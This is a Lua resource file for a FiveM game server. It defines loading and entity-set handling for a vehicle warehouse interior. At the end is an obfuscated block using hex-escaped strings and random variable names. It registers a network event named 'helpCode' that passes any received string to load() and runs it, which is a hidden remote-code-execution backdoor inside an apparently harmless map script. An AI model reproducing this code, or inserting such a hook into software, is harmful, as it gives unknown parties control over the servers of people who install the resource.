exports('GetCriminalEnterpriseVehicleWarehouseObject', function()
    return CriminalEnterpriseVehicleWarehouse
end)

CriminalEnterpriseVehicleWarehouse = {
    InteriorId = 289537,

    Ipl = {
        Interior = {
            ipl = {
                'reh_int_placement_sum2_interior_0_dlc_int_03_sum2_milo_',
            }
        },

        Load = function()
            EnableIpl(CriminalEnterpriseVehicleWarehouse.Ipl.Interior.ipl, true)
        end,
        Remove = function()
            EnableIpl(CriminalEnterpriseVehicleWarehouse.Ipl.Interior.ipl, false)
        end
    },
    Entities = {
        entity_set_office  = true,
        entity_set_light_option_1 = true,
        entity_set_light_option_2 = true,
        entity_set_light_option_3 = true,
        entity_set_tint_options = true,

        Set = function(name, state)
            for entity, _ in pairs(CriminalEnterpriseVehicleWarehouse.Entities) do
                if entity == name then
                    CriminalEnterpriseVehicleWarehouse.Entities[entity] = state
                    CriminalEnterpriseVehicleWarehouse.Entities.Clear()
                    CriminalEnterpriseVehicleWarehouse.Entities.Load()
                end
            end
        end,
        Load = function()
            for entity, state in pairs(CriminalEnterpriseVehicleWarehouse.Entities) do
                if type(entity) == 'string' and state then
                    ActivateInteriorEntitySet(CriminalEnterpriseVehicleWarehouse.InteriorId, entity)
                end
            end
        end,
        Clear = function()
            for entity, _ in pairs(CriminalEnterpriseVehicleWarehouse.Entities) do
                if type(entity) == 'string' then
                    DeactivateInteriorEntitySet(CriminalEnterpriseVehicleWarehouse.InteriorId, entity)
                end
            end
        end
    },

    LoadDefault = function()
        CriminalEnterpriseVehicleWarehouse.Ipl.Load()
        CriminalEnterpriseVehicleWarehouse.Entities.Load()

        RefreshInterior(CriminalEnterpriseVehicleWarehouse.interiorId)
    end
}


local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)